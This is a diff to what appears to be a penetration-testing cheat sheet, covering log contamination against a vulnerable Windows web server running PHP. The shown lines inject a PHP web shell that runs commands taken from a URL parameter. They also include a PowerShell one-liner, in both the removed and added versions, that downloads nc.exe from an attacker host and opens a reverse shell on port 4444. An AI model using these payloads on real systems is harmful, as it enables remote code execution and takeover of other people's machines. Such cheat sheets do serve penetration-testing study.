@@ -127,7 +127,9 @@ gcc -m32|-m64 -o output source.c
 ```php
 # Log contamination for vulnerable web app on Windows + PHP
 nc $WINDOWSTARGET 80
-<?php system('powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile(\'http://10.11.0.245/netcat/nc.exe\',\'nc.exe\'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }'); ?>
+<?php system($_GET['cmd']);?>
+# encoded ?cmd=
+powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 ```
 
 
